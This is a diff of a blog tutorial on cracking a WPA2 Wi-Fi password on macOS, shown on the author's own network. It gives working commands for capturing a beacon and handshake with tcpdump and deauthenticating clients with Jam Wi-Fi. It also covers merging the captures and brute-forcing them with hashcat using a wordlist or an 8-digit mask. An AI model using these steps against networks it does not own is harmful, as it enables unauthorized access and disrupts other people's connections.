@@ -7,11 +7,11 @@ excerpt: >-
   It took me 20 minutes to hack a password with 8 digits.
   My methods based on airport, aircrack-ng, tcpdump, wireshark, hashcat and some other software.
 categories: sysad
-tags: python xml sketches
+tags: wifi security linux macos
 toc: true
-header:
-  teaser: /assets/images/selenium/selenium_python_logo.png
-  og_image: /assets/images/selenium/selenium_python_logo.png
+# header:
+#   teaser: /assets/images/selenium/selenium_python_logo.png
+#   og_image: /assets/images/selenium/selenium_python_logo.png
 ---
 
 > Disclaimer: this post for education purposes only.
@@ -32,7 +32,6 @@ Let's start cracking ;)
 1. Install [Homebrew](https://brew.sh/)
 
 2. Install [aircrack-ng][aircrack]
-
 ```
 brew install aircrack-ng
 ```
@@ -80,6 +79,12 @@ wireshark -h
 
 ## identify the target access point
 
+> About the abbreviation
+> - Basic Service Set Identifier (BSSID).
+> - Service Set Identifier (SSID).
+> - Radio Frequency (Channel).
+> - Access Point (AP).
+
 1. Turn on Wi-Fi.
 
 2. Open Terminal.
@@ -91,16 +96,8 @@ sudo airport -s
 Now, this command will be scanning the available Wi-Fi.
 
 4. Wait till the installation is done.
-
 [![available-networks]({{ site.url }}{{ site.baseurl }}/assets/images/wifi-crack/airport-scan.png)]({{ site.url }}{{ site.baseurl }}/assets/images/wifi-crack/airport-scan.png){: .align-center}
-
 I want to hack my network named `Ruslan Gainanov` and **BSSID** `6e:57:ca:24:09:8c` and **channel** `1`.
-
-> About the abbreviation
-> - Basic Service Set Identifier (BSSID).
-> - Service Set Identifier (SSID).
-> - Radio Frequency (Channel).
-> - Access Point (AP).
 
 5. Copy the BSSID (my BSSID=`6e:57:ca:24:09:8c`) of the target Access Point.
 ```
@@ -113,7 +110,6 @@ export BSSID=6e:57:ca:24:09:8c
 ```
 networksetup -listallhardwareports
 ```
-
 The result:
 ```
 Hardware Port: Wi-Fi
@@ -137,20 +133,17 @@ sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w be
 ```
 
 5. Deauth connected devices with **Jam Wi-Fi** app. Open the app. Press **Scan**, chose the target network and press **Monitor**, then press **Do It!** to restart all connections. Wait 15 seconds and press **Done**
-
 [![deauth-clients]({{ site.url }}{{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png)]({{ site.url }}{{ site.baseurl }}/assets/images/wifi-crack/jamwifi.png){: .align-center}
 
 6. When you "Done" with death, run quickly next command. You have to capture a **handshake** in time
 ```
 sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
 ```
-
 Wait until you see some gotten frames, like this
 ```
 Got 19
 ```
-
-After you have it press "Control + C" to stop capturing.
+After you have it press `"Control + C"` to stop capturing.
 
 7. Merge the Beacon and Handshake
 ```
@@ -158,18 +151,18 @@ mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
 ```
 
 ## brute forcing
+> - Brute Force — A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.
+> - Wordlist — A written collection of all words derived from a particular source.
 
-1. Generating HCCPAX File
+.1. Generating HCCPAX File
 ```
 cap2hccapx capture.cap capture.hccapx
 ```
+Hashcat doesn’t take cap files, only hccapx files. So we need convert this files. Other way to made it is use a [online tool](https://hashcat.net/cap2hccapx/).
 
-Hashcat doesn’t take cap files, only hccapx files. So we need convert this files. Other way to made it is use a [online tool](https://hashcat.net/cap2hccapx/)
-
-The success result of command:
+Review the result. You should see the phrase `Networks detected: X... Written X WPA Handshakes`. The example of success result is:
 ```
 Networks detected: 1
-
 [*] BSSID=6e:57:ca:24:09:8c ESSID=Ruslan Gainanov (Length: 15)
 --> STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1
 --> STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1
@@ -179,20 +172,15 @@ Networks detected: 1
 Written 4 WPA Handshakes to: capture.hccapxn
 ```
 
-2. Now, everything are right to execute the **hashcat**. We can use a wordlist or a pattern to broke a password.
-> - Wordlist — A written collection of all words derived from a particular source.
-> - Brute Force — A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.
-
+.2. Now, everything are right to execute the **hashcat**. We can use a wordlist or a pattern to broke a password.
 Using a wordlist (example of wordlists - https://github.com/kennyn510/wpa2-wordlists.git):
 ```
 hashcat -m 2500 capture.hccapx wordlist.txt
 ```
-
 Using a pattern - 8 digits:
 ```
 hashcat -m 2500 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
 ```
-
 For more examples press [here](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2). For more patterns, see the [documentation](https://hashcat.net/wiki/doku.php?id=mask_attack).
 
 ## my results
